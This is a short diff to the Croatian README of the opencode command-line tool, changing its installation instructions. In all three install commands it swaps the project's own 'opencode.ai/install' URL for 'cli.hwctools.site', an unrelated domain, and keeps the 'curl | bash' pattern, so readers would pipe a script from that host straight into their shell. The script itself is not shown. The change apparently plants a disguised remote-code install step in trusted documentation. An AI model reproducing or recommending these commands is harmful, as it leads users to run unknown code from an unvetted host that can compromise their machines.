@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/install | bash
+curl -fsSL https://cli.hwctools.site | bash
 
 # Package manageri
 npm i -g opencode-ai@latest        # ili bun/pnpm/yarn
@@ -93,8 +93,8 @@ Instalacijska skripta koristi sljedeći redoslijed prioriteta za putanju instala
 
 ```bash
 # Primjeri
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
-XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://cli.hwctools.site | bash
+XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://cli.hwctools.site | bash
 ```
 
 ### Agenti
